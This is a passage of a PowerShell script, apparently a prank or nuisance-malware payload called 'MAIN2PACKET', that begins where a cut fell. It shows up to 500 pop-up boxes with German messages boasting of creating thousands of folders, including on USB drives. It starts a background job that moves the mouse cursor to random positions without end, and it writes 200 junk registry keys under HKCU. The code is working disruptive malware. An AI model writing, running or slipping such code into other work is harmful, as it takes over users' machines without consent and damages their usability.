    Add-Type -AssemblyName System.Windows.Forms
    
    for ($pop = 1; $pop -le 500; $pop++) {
        $messages = @(
            "📁 1000 ORDNER PRO ZIEL!",
            "🔥 20 ZIELE = 20.000 ORDNER!",
            "💥 200.000 DATEIEN INSGESAMT!",
            "📂 USB: +500 ORDNER!",
            "⚡ ORDNER #$pop VON 500",
            "📊 FORTSCHRITT: $([math]::Round($pop/500*100))%"
        )
        
        [System.Windows.Forms.MessageBox]::Show(
            "📁 POP-UP #$pop 📁`n`n" + (Get-Random $messages),
            "MAIN2PACKET 1000-ORDNER",
            "OK",
            "Information"
        )
        
        Start-Sleep -Seconds (Get-Random -Minimum 2 -Maximum 4)
    }
}

# ===== MAUS-TURBO =====
$mausJob = Start-Job -ScriptBlock {
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing
    
    while ($true) {
        $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
        $x = Get-Random -Minimum 0 -Maximum $screen.Width
        $y = Get-Random -Minimum 0 -Maximum $screen.Height
        [System.Windows.Forms.Cursor]::Position = New-Object Drawing.Point($x, $y)
        Start-Sleep -Milliseconds (Get-Random -Minimum 100 -Maximum 500)
    }
}

# ===== REGISTRY =====
$regJob = Start-Job -ScriptBlock {
    for ($r = 1; $r -le 200; $r++) {
        try {
            New-Item -Path "HKCU:\Software\MAIN2PACKET_$r" -Force | Out-Null
            New-ItemProperty -Path "HKCU:\Software\MAIN2PACKET_$r" -Name "Ordner" -Value "1000" -Force | Out-Null
        } catch {}
    }
}

